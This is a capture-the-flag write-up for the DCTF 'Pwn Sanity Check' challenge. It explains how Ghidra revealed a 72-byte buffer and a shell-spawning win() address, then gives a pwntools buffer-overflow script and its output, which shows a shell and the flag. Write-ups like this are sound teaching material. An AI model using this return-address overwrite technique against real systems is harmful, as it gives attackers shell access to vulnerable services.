## Pwn Sanity Check (100 Points)

### Problem
```
This should take about 1337 seconds to solve.
nc dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io 7480

Tags: Pwn, BOF
File: pwn_sanity_check
```

### Solution
I opened the binary in Ghidra and looked at `main()`, `vuln()` and `win()`.
The tag `BOF` was in the challenge description so I knew right away the task was to Buffer Overflow and get to a different address in memory.

In `vuln()` we know the buffer size for our input is 72 (`0x48` from hex to dec).

In `win()`, the address that made the most sense to get to was the one where the shell was being executed. In Ghidra, the address for this was `004006db`.

Great, so the approach was set. Now to write some python.


```python
from pwn import *

host = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)
host.recv()

buffer_overflow = b'a'*72
buffer_overflow += p64(0x004006db)

host.sendline(buffer_overflow)
host.interactive()
```

Running our exploit...

```
❯ python3 exploit.py
[+] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done
[*] Switching to interactive mode
will this work?
$ ls
flag.txt
pwn_sanity_check
startService.sh
$ cat flag.txt
dctf{Ju5t_m0v3_0n}
```


Flag: `dctf{Ju5t_m0v3_0n}`
